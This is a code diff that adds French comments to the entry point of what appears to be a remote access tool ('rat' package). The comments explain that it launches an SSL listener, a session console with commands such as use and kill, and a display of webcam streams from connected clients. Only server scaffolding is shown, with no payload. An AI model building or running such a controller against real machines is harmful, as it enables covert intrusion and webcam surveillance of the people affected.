@@ -1,9 +1,15 @@
+# Point d'entrée du serveur
+# - lance le serveur réseau SSL
+# - lance la console interactive
+# - lance l'affichage du stream webcam (OpenCV)
+
 from rat.server.server import SSLServer, SSLServerThread
 from threading import Thread
 
 
 def main():
 
+    # Création du serveur sécurisé
     server = SSLServer(
         host="0.0.0.0",
         port=8888,
@@ -12,13 +18,13 @@ def main():
         client_cert="certs/cert.pem",
     )
 
-    # ✅ thread réseau
+    # Thread réseau : gestion des connexions clients + SSL handshake
     SSLServerThread(server).start()
 
-    # ✅ thread console
+    # Thread console : interface commande (sessions, use, kill, etc.)
     Thread(target=server.run_console, daemon=True).start()
 
-    # ✅ MAIN THREAD = OpenCV UI
+    # Thread principal : affichage du stream webcam (OpenCV GUI)
     server.run_stream_display()
 
 
